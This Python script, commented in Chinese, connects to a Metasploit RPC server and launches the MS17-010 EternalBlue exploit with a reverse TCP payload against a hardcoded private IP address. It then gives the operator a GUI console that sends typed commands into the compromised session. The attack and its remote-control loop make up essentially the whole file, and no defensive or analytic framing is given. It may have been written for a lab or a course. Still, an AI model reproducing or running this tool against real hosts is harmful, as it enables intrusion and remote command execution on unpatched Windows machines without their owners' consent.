import asyncio
import sys
import threading
from typing import Callable

import pymetasploit3.msfrpc
from pymetasploit3.msfrpc import MsfRpcClient

from libs.Attack import Attack, AttackError
from libs.GUI import GUI
from libs.Logger import Logger
from libs.Modules import Modules
from libs.Payloads import Payloads

client: MsfRpcClient
logger = Logger('Main')
gui = GUI('My Console')
stop_funcs: list[Callable]


@gui.event
async def on_input_line(self, text):
    # 若無 client 定義、連線
    if not client:
        self.println('請等待 RPC 連線成功再輸入指令')
        return

    # 若無 Session
    if len(client.sessions.list) == 0:
        self.println('目前無可用的 session 連線')
        return

    # 顯示輸入內容
    self.println(f'$ {text}')

    # 傳送指令
    shell = client.sessions.session(list(client.sessions.list.keys())[0])
    shell.write(text)


def attack_thread():
    """
    異步攻擊線程

    """

    # 建立客戶端
    try:
        logger.info('正在連線到 RPC...')
        global client
        client = MsfRpcClient("salt", port=55553, ssl=True)
        logger.succ('成功連線到 RPC')
    except pymetasploit3.msfrpc.MsfAuthError:
        logger.err('驗證失敗，無法連線到 RPC')
        sys.exit(1)

    try:
        # 建立攻擊
        atk = Attack(client,
                     Modules.MS17_010_ETERNALBLUE,
                     Payloads.REVERSE_TCP,
                     ('RHOSTS', '192.168.2.116'),
                     )
    except AttackError:
        sys.exit(1)

    stop_funcs.append(atk.stop)

    @atk.event
    async def on_read(text):
        gui.println(text)

    # 開始攻擊
    logger.info('正在開始攻擊...')
    gui.print(atk.run())


async def main():
    # 異步線程執行攻擊
    t1 = threading.Thread(target=attack_thread)
    t1.start()

    # 建立介面
    await gui.build()

    # 等待攻擊線程完成
    logger.info('正在關閉...')

    for func in stop_funcs:
        func()

    t1.join(timeout=60)
    logger.succ('關閉完成')


if __name__ == "__main__":
    asyncio.run(main())
